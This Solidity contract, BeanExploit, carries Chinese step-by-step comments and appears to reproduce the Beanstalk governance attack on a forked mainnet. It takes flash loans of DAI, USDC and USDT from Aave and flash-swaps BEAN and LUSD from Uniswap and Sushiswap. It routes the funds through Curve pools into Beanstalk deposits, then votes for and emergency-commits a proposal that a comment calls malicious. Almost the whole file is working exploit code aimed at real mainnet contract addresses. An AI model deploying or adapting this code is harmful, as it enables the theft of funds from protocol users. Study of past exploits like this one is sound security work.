// //SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "hardhat/console.sol";
import "./FlashloanBase.sol";
import "./BIP18.sol";
import "../interfaces/ICurve.sol";
import "../interfaces/IUniswapV2Pair.sol";
import "../interfaces/IUniswapV3Pool.sol";
import "../interfaces/IBeanStalk.sol";
import "../interfaces/IGovernanceFacet.sol";

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
}
interface IEXPBIP {
    function init() external;
}

interface IRouter {
    function factory() external view returns (address);
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

contract BeanExploit is
    FlashLoanReceiverBase(
        ILendingPoolAddressesProvider(
            0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5  // Aave: Lending Pool Provider V2
        )
    ),
    IUniswapV2Callee  // 继承 uniswapcallee 才可以实现uniswap flash swap 
{
    // uniswap的router合约
    address public constant router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;


    //对于第一步的借款
    uint256 constant DAI_AMOUNT = 350_000_000 * 1e18;
    uint256 constant USDC_AMOUNT = 500_000_000 * 1e6;
    uint256 constant USDT_AMOUNT = 150_000_000 * 1e6;
    uint256 constant BEAN_AMOUNT = 32100950626687;
    uint256 constant LUSD_AMOUNT = 11643065703498478902362927;


    uint256 constant LUSD_EXCHANGE_AMOUNT = 15_000_000 * 1e18;
    uint256 constant CRV_TOKENS = 964691328662155074401448409;
    uint256 constant BEANCRV_F_AMOUNT = 795425740813818200295323741;
    uint256 constant BEANLUSD_F_AMOUNT = 58924887872471876761750555;
    uint256 constant UNI_LP_TOKEN_AMOUNT = 540716100968756904;

    address constant DAI = address(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    address constant USDT = address(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    address constant USDC = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address constant BEAN = address(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    address constant LUSD = address(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0);
    address constant WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address constant UNI_V2_BEAN_LP =
        address(0x87898263B6C5BABe34b4ec53F22d98430b91e371);
    address UNI_V3_DAI_USDC =
        address(0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168);
    address UNI_V3_USDC_WETH =
        address(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    address UNI_V3_USDT_WETH =
        address(0x4e68Ccd3E89f51C3074ca5072bbAC773960dFa36);
    address SWAP_ROUTER = address(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    address LUSD_OHM_SUSHI =
        address(0x46E4D8A1322B9448905225E52F914094dBd6dDdF);

    address CRV = address(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    address CURVE_DAI_USDT_USDC =
        address(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    address LUSDCRV_F = address(0xEd279fDD11cA84bEef15AF5D39BB4d4bEE23F0cA);
    address BEANCRV_F = address(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    address BEANLUSD_F = address(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D);

    address BEANSTALK = address(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
    address SILO_V2 = address(0x23D231f37c8F5711468C8AbbFbf1757d1f38FDA2);

    constructor() {
        IERC20(DAI).approve(CURVE_DAI_USDT_USDC, type(uint256).max);
        IERC20(USDC).approve(CURVE_DAI_USDT_USDC, type(uint256).max);
        IUSDT(USDT).approve(CURVE_DAI_USDT_USDC, type(uint256).max);
        IERC20(CRV).approve(LUSDCRV_F, type(uint256).max);
        IERC20(LUSD).approve(LUSDCRV_F, type(uint256).max);
        IERC20(CRV).approve(BEANCRV_F, CRV_TOKENS);
        IERC20(LUSD).approve(BEANLUSD_F, type(uint256).max);
        IERC20(BEAN).approve(BEANLUSD_F, BEAN_AMOUNT);
        IERC20(BEANLUSD_F).approve(BEANSTALK, type(uint256).max);
        IERC20(LUSDCRV_F).approve(BEANSTALK, type(uint256).max);
        IERC20(BEANCRV_F).approve(BEANSTALK, type(uint256).max);
        IERC20(CRV).approve(CURVE_DAI_USDT_USDC, type(uint256).max);
        IERC20(DAI).approve(SWAP_ROUTER, type(uint256).max);
        IERC20(USDC).approve(SWAP_ROUTER, type(uint256).max);
        IUSDT(USDT).approve(SWAP_ROUTER, type(uint256).max);
    }

    function exploit() public payable {
        console.log(IERC20(WETH).balanceOf(address(this)));

        // takeETHtoBEAN();

        console.log(IERC20(BEAN).balanceOf(address(this)));

        // 开始闪电
        takeFlashLoanFromAave();



    }




    function takeFlashLoanFromAave() internal {
        address[] memory assets = new address[](3);
        assets[0] = DAI;
        assets[1] = USDC;
        assets[2] = USDT;

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = DAI_AMOUNT;
        amounts[1] = USDC_AMOUNT;
        amounts[2] = USDT_AMOUNT;

        uint256[] memory modes = new uint256[](3);
        modes[0] = 0;
        modes[1] = 0;
        modes[2] = 0;

        bytes memory params = "";

        ILendingPool(LENDING_POOL).flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            params,
            0
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        // Approve
        // for (uint256 i = 0; i < assets.length; i++) {
        //     uint256 amountOwing = amounts[i] + premiums[i];
        //     console.log(assets[i],amountOwing);
        //     IERC20(address(assets[i])).approve(address(LENDING_POOL), amountOwing);
        // }
        IERC20(DAI).approve(address(LENDING_POOL), amounts[0] + premiums[0]);
        IERC20(USDC).approve(address(LENDING_POOL), amounts[1] + premiums[1]);
        IUSDT(USDT).approve(address(LENDING_POOL), amounts[2] + premiums[2]);

        console.log(
            "[1/xxx]Recieved 150M  USDT from Aave",
            IERC20(USDT).balanceOf(address(this))
        );
        console.log(
            "[2/xxx]Recieved 500M USDC from Aave",
            IERC20(USDC).balanceOf(address(this))
        );
        console.log(
            "[3/xxx]Recieved 350M DAI from Aave",
            IERC20(DAI).balanceOf(address(this))
        );



        
        takeFlashLoanFromUniswap();



        // 17.将剩余的16,471,404 LUSD兑换成16,184,690 3Crv。
        // 0 -> LUSD; 1-> CRV
        uint256 lusd_returned = ICurve(LUSDCRV_F).exchange(
            0,
            1,
            IERC20(LUSD).balanceOf(address(this)),
            0
        );
        console.log("[17/xxx]Exchange LUSD to CRV from LUSDCRV-f ");


        //18.移除511,959,710.180617886302214702 3Crv流动性，得到522,487,380 USDC，365,758,059 DAI以及156,732,232 USDT。
        // ICurve(CURVE_DAI_USDT_USDC).remove_liquidity_one_coin(
        //     IERC20(CURVE_DAI_USDT_USDC).balanceOf(address(this)),
        //     0,
        //     0
        // );
        // ICurve(CURVE_DAI_USDT_USDC).remove_liquidity_one_coin(
        //     IERC20(CURVE_DAI_USDT_USDC).balanceOf(address(this)),
        //     1,
        //     0
        // );
        // ICurve(CURVE_DAI_USDT_USDC).remove_liquidity_one_coin(
        //     IERC20(CURVE_DAI_USDT_USDC).balanceOf(address(this)),
        //     2,
        //     0
        // );
        uint256 threeCrvBalance = IERC20(CRV).balanceOf(address(this));
        console.log(threeCrvBalance);
        ICurve(CURVE_DAI_USDT_USDC).remove_liquidity_one_coin(
            (threeCrvBalance * 35)/100,
            0,
            0
        );
        ICurve(CURVE_DAI_USDT_USDC).remove_liquidity_one_coin(
            (threeCrvBalance * 50)/100,
            1,
            0
        );
        ICurve(CURVE_DAI_USDT_USDC).remove_liquidity_one_coin(
            (threeCrvBalance * 15)/100,
            2,
            0
        );
        console.log("[18/xxx]Remove liquidity from 3CRV Pool to get USDC, USDT & DAI back.");




        // Silence compiler
        {
            assets;
            amounts;
            premiums;
            initiator;
            params;
        }
        return true;
    }


    function takeFlashLoanFromUniswap() public {
        bytes memory data = abi.encode(uint256(1));
        IUniswapV2Pair(UNI_V2_BEAN_LP).swap(0, BEAN_AMOUNT, address(this), data);  // 这里是后面为BEAN的数量
        
    }

    function takeFlashLoanFromSushiswap() public {
        bytes memory data = abi.encode(uint256(2));
        IUniswapV2Pair(LUSD_OHM_SUSHI).swap(LUSD_AMOUNT, 0, address(this), data);  // 这里是前面为LUSD的数量
    }

    // uniswap flash swap 实现代码,目的从Uniswap平台借贷32.1M BEAN
    function uniswapV2Call(
        address sender, uint amount0,
        uint amount1, bytes calldata data) external override
    {
        // 这里实现一个判断，由于uniswap和sushiswap都是支持flash swap的
        // data = 1 就是从uniswap借钱
        uint256 selector = abi.decode(data, (uint256));
        if (selector == 1) {
            // uniswap 的借钱
            console.log("[4/xxx]Recieved 32.1M BEAN from Uniswap",IERC20(BEAN).balanceOf(address(this)));
            takeFlashLoanFromSushiswap();
            
            // 16.将 32197543 BEAN 的闪存返回到 Uniswap V2  包含手续费
            uint256 returnAmountFee = (amount1 * 1000) / 997 + 1;
            IERC20(BEAN).transfer(UNI_V2_BEAN_LP,returnAmountFee); // 这里是给UNI_V2_BEAN_LP发手续费
            console.log("[16/xxx]Returned to uniswap",returnAmountFee);

        }else if(selector == 2){
            //要换的钱
            uint256 returnAmountFee = (amount0 * 1000) / 997 + 1;

            // sushiswap 的借钱
            console.log("[5/xxx]Recieved 11.6M LUSD from Sushiswap",IERC20(LUSD).balanceOf(address(this)));
            addAmountToCurve();

            // 15.归还SushiSwap闪电贷的11,678,100 LUSD
            IERC20(LUSD).transfer(LUSD_OHM_SUSHI, returnAmountFee);
            console.log("[15/xxx]Returned to sushiswap", returnAmountFee);

        }
    }


    // 将借入的DAI、USDC以及USDT全部投入到Curve DAI/USDC/USDT流动性矿池中，铸造出979,691,328个流动性代币3Crv。
    function addAmountToCurve() public {
        ICurve(CURVE_DAI_USDT_USDC).add_liquidity([DAI_AMOUNT,USDC_AMOUNT,USDT_AMOUNT],0); // 这里usdc和usdt的顺序不能乱
        console.log(
            "[6/xxx]Add DAI USDT USDC to Curve Pool",
            IERC20(CRV).balanceOf(address(this))
        );

        // 将15M 3Crv兑换成15,251,318 LUSD
        uint256 lusd_returned = ICurve(LUSDCRV_F).exchange(
            1,
            0,
            LUSD_EXCHANGE_AMOUNT,
            // To get "dy" for liquidity
            ICurve(LUSDCRV_F).get_dy(0, 1, LUSD_EXCHANGE_AMOUNT)
        );
        
        console.log(
            "[7/xxx]exchange 3crv to lusd",
            IERC20(LUSD).balanceOf(address(this))
        );

        // 将964,691,328 3Crv添加流动性获得795,425,740 BEAN3CRV-f
        ICurve(BEANCRV_F).add_liquidity([0,CRV_TOKENS],636647182340103460666028018);
        console.log(
            "[8/xxx]exchange 3crv to BEAN3CRV-f",
            IERC20(BEANCRV_F).balanceOf(address(this))
        );


        // 将32,100,950 BEAN以及26,894,383 LUSD添加流动性，获取58,924,887BEANLUSD-f
        ICurve(BEANLUSD_F).add_liquidity([BEAN_AMOUNT,LUSD_AMOUNT+lusd_returned],47145751087025638235047870);
        console.log(
            "[9/xxx]Add bean and lusd for BEANLUSD-f",
            IERC20(BEANLUSD_F).balanceOf(address(this))
        );


        // 10.使用上面得到的所有BEAN3CRV-f,BEANLUSD-f提案进行投票，使提案通过并执行。
        IBeanStalk(BEANSTALK).deposit(BEANLUSD_F,BEANLUSD_F_AMOUNT);
        IBeanStalk(BEANSTALK).deposit(BEANCRV_F,BEANCRV_F_AMOUNT);


        // IBeanStalk(BEANSTALK).depositBeans(IERC20(BEANLUSD_F).balanceOf(address(this)));
        // IBeanStalk(BEANSTALK).depositBeans(IERC20(BEANCRV_F).balanceOf(address(this)));


        // 漏洞点
        // IDiamondCut.FacetCut[]
        //     memory _diamondCut = new IDiamondCut.FacetCut[](0);
        
        // IGovernanceFacet(BEANSTALK).propose(
        //     _diamondCut,
        //     address(0xefAB0Beb0A557E452b398035eA964948c750b2Fd), 
        //     abi.encodeWithSelector(ExploitBIP.init.selector),
        //     3
        // );


        // 获取最新的提案
        uint32[] memory bips = IGovernanceFacet(BEANSTALK).activeBips();
        uint32 bip = bips[bips.length - 1];
        console.log("we Bip:",bip);
        uint256 amount = IERC20(BEAN).balanceOf(address(this));
        // IBeanStalk(BEANSTALK).depositBeans(amount);




        IGovernanceFacet(BEANSTALK).vote(bip);
        console.log("[10/xxx]Executed Vote for BIP");

        // // 11.调用我们自己创建的恶意提案
        IGovernanceFacet(BEANSTALK).emergencyCommit(bip);
        // console.log("[11/xxx]emergencyCommit !");


        // 13.去除流动性 删除 874，663，982 CRV 单一流动性，以获得 1，007，734，729 CRV 代币
        ICurve(BEANCRV_F).remove_liquidity_one_coin(IERC20(BEANCRV_F).balanceOf(address(this)),1,0);
        console.log("[13/xxx]Remove single asset liquidity from BEAN3CRV-f");
        
        // 14 删除 60562844 BEANLUSD-f 单一流动性，以获得 28149504 LUSD
        ICurve(BEANLUSD_F).remove_liquidity_one_coin(IERC20(BEANLUSD_F).balanceOf(address(this)),1,0);
        console.log("[14/xxx]Remove single asset liquidity from BEANLUSD-f");

    }



    function getBalance() public {
        console.log(
            IERC20(USDT).balanceOf(address(this))
        );
        console.log(
            IERC20(USDC).balanceOf(address(this))
        );
        console.log(
            IERC20(DAI).balanceOf(address(this))
        );
    }
}
   

    